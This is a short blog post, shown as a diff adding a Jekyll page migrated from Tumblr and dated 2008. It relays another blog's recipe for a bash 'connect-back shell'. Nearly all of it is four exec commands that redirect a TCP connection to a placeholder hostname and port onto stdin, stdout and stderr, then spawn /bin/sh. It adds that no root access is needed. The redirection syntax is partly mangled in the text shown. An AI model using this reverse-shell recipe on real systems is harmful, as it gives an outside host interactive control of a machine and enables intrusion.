@@ -1,0 +1,17 @@
+---
+layout: post
+title: Connect-back shell in four lines
+date: '2008-04-17T13:09:23-05:00'
+tags: []
+tumblr_url: https://synapsecollapse.tumblr.com/post/32069817
+---
+<p>From <a href="https://labs.neohapsis.com/2008/04/17/connect-back-shell-literally/">this blog post</a>, you can create a connect-back shell with four BASH commands:<br/></p><blockquote><code>
+$ exec 0/tcp/hostname/port # First we copy our connection over stdin<br/>
+
+$ exec 1&gt;&amp;0 # Next we copy stdin to stdout<br/>
+
+$ exec 2&gt;&amp;0 # And finally stdin to stderr<br/>
+
+$ exec /bin/sh 0/tcp/hostname/port 1&gt;&amp;0 2&gt;&amp;0</code></blockquote>
+
+Oh, and you can do that without root/wheel access.
